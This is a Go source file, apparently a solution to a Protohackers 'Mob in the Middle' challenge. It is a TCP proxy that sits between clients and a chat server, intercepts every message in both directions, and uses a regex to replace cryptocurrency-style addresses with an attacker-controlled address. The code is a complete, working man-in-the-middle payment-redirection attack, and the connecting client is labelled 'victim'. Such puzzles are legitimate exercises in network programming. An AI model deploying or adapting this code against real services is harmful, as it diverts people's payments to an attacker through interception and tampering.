package main

import (
	"bufio"
	"context"
	"log"
	"net"
	"regexp"
)

const (
	tonysAddress  = "7YWHMfk9JZe0LM0g1ZauHuiSxhI"
	portString    = ":6666"
	serverAddress = ""
)

var bogusCoinRE = regexp.MustCompile(`\b7[[:alnum:]]{25,34}\b`)

func main() {
	s := NewMITMServer()
	s.Serve()
}

type MITMServer struct {
	net.Listener
}

func NewMITMServer() MITMServer {
	ln, err := net.Listen("tcp", portString)
	if err != nil {
		log.Fatalln("could not start server: ", err)
	}
	return MITMServer{
		ln,
	}
}

func (s MITMServer) Serve() {
	for {
		conn, err := s.Accept()
		if err != nil {
			log.Println("accept: ", err.Error())
		}
		log.Println("connection from", conn.RemoteAddr())
		go handle(conn)
	}
}

func handle(victim net.Conn) {
	ctx, cancel := context.WithCancel(context.Background())

	serverConn, err := net.Dial("tcp", "chat.protohackers.com:16963")
	log.Printf("connecting client %s to %s", victim.RemoteAddr(), serverConn.RemoteAddr())
	if err != nil {
		log.Println("could not connect to Budget chat server: ", err)
	}
	victimReader := bufio.NewReader(victim)
	serverReader := bufio.NewReader(serverConn)

	toVictim := make(chan []byte, 5)
	toServer := make(chan []byte, 5)

	go func(ctx context.Context) {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				msg, err := serverReader.ReadBytes('\n')
				if err != nil {
					log.Println("error reading from server: ", err)
					cancel()
				}
				log.Printf("to: %v, intercepted <- %s", victim.RemoteAddr(), msg)
				toVictim <- rewriteMsg(msg)
			}
		}
	}(ctx)

	go func(ctx context.Context) {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				msg, err := victimReader.ReadBytes('\n')
				if err != nil {
					log.Println("error reading from server: ", err)
					cancel()
				}
				log.Printf("from: %v, intercepted -> %s", victim.RemoteAddr(), msg)
				toServer <- rewriteMsg(msg)
			}
		}
	}(ctx)

	for {
		select {
		case msg := <-toVictim:
			victim.Write(msg)
		case msg := <-toServer:
			serverConn.Write(msg)
		case <-ctx.Done():
			victim.Close()
			serverConn.Close()
			return
		}
	}
}

func rewriteMsg(s []byte) []byte {
	return bogusCoinRE.ReplaceAll(s, []byte(tonysAddress))
}
